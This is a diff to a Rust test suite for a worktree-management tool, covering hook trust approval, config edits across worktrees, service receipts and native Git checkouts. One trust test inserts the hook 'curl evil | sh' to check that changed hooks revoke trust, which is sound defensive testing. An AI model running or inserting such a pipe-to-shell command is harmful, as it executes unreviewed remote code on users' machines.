@@ -233,6 +233,14 @@ fn trusted(project: &Project) -> SetupOptions {
     }
 }
 
+/// The approval of the scope of the workspace at `dir`.
+fn trusted_at(project: &Project, dir: &Path) -> SetupOptions {
+    SetupOptions {
+        approval: Some(trust::Approval::of(&trust::scope_at(project, dir))),
+        ..Default::default()
+    }
+}
+
 fn receipt_of(ws: &Workspace) -> Receipt {
     Receipt::load(&ws.git_dir).unwrap().expect("receipt")
 }
@@ -553,8 +561,9 @@ fn changing_the_hooks_revokes_trust() {
         trust::state(&t.project).unwrap(),
         trust::TrustState::Trusted
     );
-    let mut changed = t.project.clone();
-    changed.config.hooks.setup.push("curl evil | sh".into());
+    let changed = edit_config(&t, |text| {
+        text.replace("setup = ['true']", "setup = ['true', 'curl evil | sh']")
+    });
     let out = create(&changed, "feature", SetupOptions::default()).unwrap();
     assert_eq!(out.status, Status::NeedsAttention);
     match trust::state(&changed).unwrap() {
@@ -630,13 +639,17 @@ fn a_failing_hook_is_reported_in_the_outcome_and_retried_on_resume() {
             .contains("boom")
     );
 
-    // Fix the hooks and resume.
-    let mut fixed = t.project.clone();
-    fixed.config.hooks.setup = vec!["touch .devflow/fixed".into()];
+    // Fix the hooks (the workspace's own recipes) and resume.
+    let fixed = edit_config(&t, |text| {
+        text.replace(
+            "setup = ['echo before', 'echo boom; exit 7', 'touch .devflow/after']",
+            "setup = ['touch .devflow/fixed']",
+        )
+    });
     let out = setup::setup(
         &fixed,
         &out.workspace,
-        trusted(&fixed),
+        trusted_at(&fixed, &out.workspace.path),
         false,
         false,
         &mut NoProgress,
@@ -656,8 +669,9 @@ fn hook_timeout_marks_the_workspace_needing_attention() {
         },
         "",
     );
-    let mut project = t.project.clone();
-    project.config.hooks.timeout = "300ms".into();
+    let project = edit_config(&t, |text| {
+        text.replace("[hooks]\n", "[hooks]\ntimeout = \"300ms\"\n")
+    });
     let started = std::time::Instant::now();
     let out = create(&project, "slow", trusted(&project)).unwrap();
     assert!(started.elapsed() < std::time::Duration::from_secs(10));
@@ -1166,11 +1180,22 @@ fn a_version_one_receipt_is_migrated_by_the_next_setup_which_rewrites_only_the_e
 
 const SERVICE: &str = "\n[services.db]\nengine = \"postgres\"\nmode = \"external\"\n";
 
-/// Append `text` to the project's `devflow.toml` and reload the project.
-fn edit_config(t: &Repo, edit: impl FnOnce(String) -> String) -> Project {
-    let path = t.root.join("devflow.toml");
-    let text = edit(std::fs::read_to_string(&path).unwrap());
-    std::fs::write(&path, text).unwrap();
+/// Edit the project's `devflow.toml` and reload the project. The same edit is
+/// made (and committed) in the `devflow.toml` of every worktree, as if it had
+/// been committed on every branch: a workspace runs the recipes of its own branch,
+/// and these tests are about a configuration change reaching them. A test about
+/// a branch that differs writes its own file (see `recipes.rs`).
+fn edit_config(t: &Repo, edit: impl Fn(String) -> String) -> Project {
+    let before = Project::open(&t.root).unwrap();
+    for workspace in worktree::list(&before).unwrap() {
+        let path = workspace.path.join("devflow.toml");
+        if let Ok(text) = std::fs::read_to_string(&path) {
+            std::fs::write(&path, edit(text)).unwrap();
+            // Committed, so the checkout stays clean and a branch made later
+            // from this one carries the change.
+            commit_all(&git2::Repository::open(&workspace.path).unwrap(), "config");
+        }
+    }
     Project::open(&t.root).unwrap()
 }
 
@@ -2397,8 +2422,9 @@ fn remove_checks_every_protection_before_any_effect() {
         .unwrap();
 
     // Untrusted teardown hooks refuse (they would otherwise run unreviewed code).
-    let mut changed = t.project.clone();
-    changed.config.hooks.teardown.push("echo more".into());
+    let changed = edit_config(&t, |text| {
+        text.replace("teardown = ['", "teardown = ['echo more', '")
+    });
     let error = setup::remove(
         &changed,
         "guarded",
@@ -2409,6 +2435,10 @@ fn remove_checks_every_protection_before_any_effect() {
     assert!(error.to_string().contains("not trusted"), "{error:#}");
     assert!(protection(&error).forceable);
     still_there();
+    // The recipes go back to what was approved.
+    edit_config(&t, |text| {
+        text.replace("teardown = ['echo more', '", "teardown = ['")
+    });
 
     // Unmerged branches are protected up front when deleting the branch.
     let repo = git2::Repository::open(&w.path).unwrap();
@@ -2666,8 +2696,12 @@ fn switch_runs_switch_hooks_each_time_but_only_when_trusted_and_ready() {
     assert_eq!(std::fs::read_to_string(&log).unwrap().lines().count(), 2);
 
     // A failing switch hook is a warning with the report attached.
-    let mut failing = t.project.clone();
-    failing.config.hooks.switch = vec!["exit 9".into()];
+    let failing = edit_config(&t, |text| {
+        text.replace(
+            "switch = ['echo switched >> .devflow/switch.log']",
+            "switch = ['exit 9']",
+        )
+    });
     trust::approve(&failing).unwrap();
     let out = setup::activate(&failing, &w, SetupOptions::default(), &mut NoProgress).unwrap();
     assert!(
@@ -4599,6 +4633,7 @@ fn a_removal_drops_the_branch_recorded_before_its_creation_and_only_this_instanc
             service: service.into(),
             branch_id: id,
             engine,
+            file: None,
         });
         receipt.save(&w.git_dir).unwrap();
         (w, server, id)
@@ -4662,6 +4697,7 @@ fn a_removal_drops_the_branch_recorded_before_its_creation_and_only_this_instanc
         service: "db".into(),
         branch_id: never,
         engine: Some(devflow_core::config::Engine::Postgres),
+        file: None,
     });
     receipt.save(&w.git_dir).unwrap();
     let out = setup::remove(
@@ -4798,6 +4834,7 @@ fn renaming_a_service_never_reuses_its_orphaned_branch_and_recovery_is_by_record
         service: "main".into(),
         branch_id: lost,
         engine: Some(devflow_core::config::Engine::Postgres),
+        file: None,
     });
     crashed.set_phase(Phase::Services, PhaseState::Started, None);
     crashed.save(&a_ws.git_dir).unwrap();
@@ -4838,6 +4875,7 @@ fn renaming_a_service_never_reuses_its_orphaned_branch_and_recovery_is_by_record
         service: "db".into(),
         branch_id: lost,
         engine: Some(devflow_core::config::Engine::Postgres),
+        file: None,
     });
     other.set_phase(Phase::Services, PhaseState::Started, None);
     other.save(&a_ws.git_dir).unwrap();
@@ -6951,6 +6989,7 @@ fn crashed_creation(
         service: service.into(),
         branch_id: id,
         engine,
+        file: None,
     });
     receipt.save(&w.git_dir).unwrap();
     (t, w, id)
@@ -7035,6 +7074,7 @@ fn pending_on_another_engine(
         service: "db".into(),
         branch_id: id,
         engine: Some(recorded),
+        file: None,
     });
     receipt.save(&w.git_dir).unwrap();
     (t, w, id)
@@ -7185,6 +7225,7 @@ fn another_service_cannot_erase_a_pending_intent_before_its_own_guard() {
         service: "db".into(),
         branch_id: id,
         engine: Some(Engine::Postgres),
+        file: None,
     };
     let (t, w, results) = attach_with_pending(
         "[services.aaa]\nengine = \"postgres\"\n\n[services.db]\nengine = \"valkey\"\n",
@@ -7251,6 +7292,7 @@ fn a_pending_intent_stays_on_the_workspace_record_through_a_forced_removal() {
             service: "db".into(),
             branch_id: id,
             engine: Some(Engine::Postgres),
+            file: None,
         },
     );
     for (how, result) in ["setup", "activation"].into_iter().zip(results) {
@@ -7320,6 +7362,7 @@ fn a_pending_intent_of_a_service_no_longer_configured_stops_the_others() {
             service: "db".into(),
             branch_id: id,
             engine: Some(Engine::Postgres),
+            file: None,
         },
     );
     for (how, result) in ["setup", "activation"].into_iter().zip(results) {
@@ -7353,6 +7396,7 @@ fn an_attachment_clears_no_intent_that_is_not_its_own() {
             service: "gone".into(),
             branch_id: id,
             engine: Some(Engine::Postgres),
+            file: None,
         },
     );
     for (how, result) in ["setup", "activation"].into_iter().zip(results) {
@@ -9013,7 +9057,7 @@ fn a_port_is_not_added_where_the_recipes_are_not_approved() {
     let mut receipt = receipt_of(&w);
     receipt.app_port = None;
     receipt.save(&w.git_dir).unwrap();
-    trust::revoke(&t.project).unwrap();
+    trust::revoke_all(&t.project).unwrap();
     let out = setup::activate(&t.project, &w, SetupOptions::default(), &mut NoProgress).unwrap();
     assert_eq!(
         out.status,
@@ -9878,4 +9922,127 @@ fn a_duplicate_reservation_of_one_identity_is_deduplicated() {
     copy.app_port = None;
     copy.save(&b.workspace.git_dir).unwrap();
     assert_eq!(holders(), 1, "the original's reservation is the one left");
+}
+
+/// A repository that checks worktrees out with Git, whose `post-checkout`
+/// hook is `script`.
+#[cfg(unix)]
+fn native_repo_with_hook(script: &str) -> Repo {
+    use std::os::unix::fs::PermissionsExt;
+    let t = plain();
+    let hooks = t.root.join(".git/hooks");
+    std::fs::create_dir_all(&hooks).unwrap();
+    let hook = hooks.join("post-checkout");
+    std::fs::write(&hook, format!("#!/bin/sh\n{script}\n")).unwrap();
+    std::fs::set_permissions(&hook, std::fs::Permissions::from_mode(0o755)).unwrap();
+    std::fs::write(
+        t.root.join("devflow.local.toml"),
+        "[worktree]\ncheckout = \"git\"\n",
+    )
+    .unwrap();
+    let project = Project::open(&t.root).unwrap();
+    Repo { project, ..t }
+}
+
+#[cfg(unix)]
+fn git_runs() -> bool {
+    std::process::Command::new("git")
+        .arg("--version")
+        .output()
+        .map(|out| out.status.success())
+        .unwrap_or(false)
+}
+
+#[cfg(unix)]
+#[test]
+fn a_native_checkout_is_recorded_and_sets_the_worktree_up_once() {
+    if !git_runs() {
+        eprintln!("skipped: no git on PATH");
+        return;
+    }
+    let t = native_repo_with_hook(
+        "echo \"$DEVFLOW_SETUP_ACTIVE\" >> \"$(git rev-parse --git-common-dir)/hook-ran\"",
+    );
+    let out = create(&t.project, "native", SetupOptions::default()).unwrap();
+    assert_eq!(out.status, Status::Ready);
+    let checkout = out.checkout.as_ref().expect("the backend is reported");
+    assert_eq!(checkout.backend, devflow_core::config::CheckoutBackend::Git);
+    let detail = out
+        .receipt
+        .phase(Phase::Materialize)
+        .detail
+        .clone()
+        .unwrap_or_default();
+    assert!(detail.contains("checked out by Git"), "{detail}");
+    // Git ran the hook once, with devflow's re-entry guard set.
+    let ran = std::fs::read_to_string(t.root.join(".git/hook-ran")).unwrap();
+    assert_eq!(ran.trim(), "1");
+    assert!(out.workspace.path.join("README.md").is_file());
+    let json = serde_json::to_value(&out).unwrap();
+    assert_eq!(json["checkout"]["backend"], "git");
+}
+
+#[cfg(unix)]
+#[test]
+fn a_native_checkout_that_failed_after_the_checkout_is_resumed_by_its_identity() {
+    if !git_runs() {
+        eprintln!("skipped: no git on PATH");
+        return;
+    }
+    // The hook fails once (Git reports the failure, keeps the worktree), then
+    // works: the person fixed whatever it complained about.
+    let t = native_repo_with_hook(
+        "dir=\"$(git rev-parse --git-common-dir)\"; \
+         if [ ! -e \"$dir/hook-fixed\" ]; then echo 'hook refuses' >&2; exit 1; fi",
+    );
+    let error = create(&t.project, "resumed", SetupOptions::default()).unwrap_err();
+    let problem = error
+        .downcast_ref::<devflow_core::remedy::Problem>()
+        .expect("typed");
+    assert!(problem.message.contains("hook refuses"), "{problem:?}");
+    let path = worktree::path_for(&t.project, "resumed");
+    assert!(
+        problem
+            .remedies
+            .contains(&devflow_core::remedy::Remedy::Setup {
+                workspace: path.clone()
+            }),
+        "{problem:?}"
+    );
+    // The branch and the worktree survived; libgit2 made nothing instead.
+    assert!(path.join("README.md").is_file());
+    let survivor = ws(&t.project, "resumed");
+    assert_eq!(survivor.branch.as_deref(), Some("resumed"));
+    assert!(Receipt::load(&survivor.git_dir).unwrap().is_none());
+
+    // Running the creation again finds the checkout by its identity and
+    // points at setting it up; it does not make another or fall back.
+    let again = create(&t.project, "resumed", SetupOptions::default()).unwrap_err();
+    let again = again
+        .downcast_ref::<devflow_core::remedy::Problem>()
+        .expect("typed");
+    assert!(again.message.contains("has not set it up"), "{again:?}");
+    assert!(
+        again
+            .remedies
+            .contains(&devflow_core::remedy::Remedy::Setup {
+                workspace: survivor.path.clone()
+            })
+    );
+
+    // Setting it up resumes: the checkout's own worktree, one receipt.
+    std::fs::write(t.root.join(".git/hook-fixed"), "").unwrap();
+    let out = setup::setup(
+        &t.project,
+        &survivor,
+        SetupOptions::default(),
+        false,
+        false,
+        &mut NoProgress,
+    )
+    .unwrap()
+    .unwrap();
+    assert_eq!(out.status, Status::Ready);
+    assert_eq!(out.workspace.path, survivor.path);
+    assert_eq!(receipt_of(&survivor).workspace, "resumed");
 }
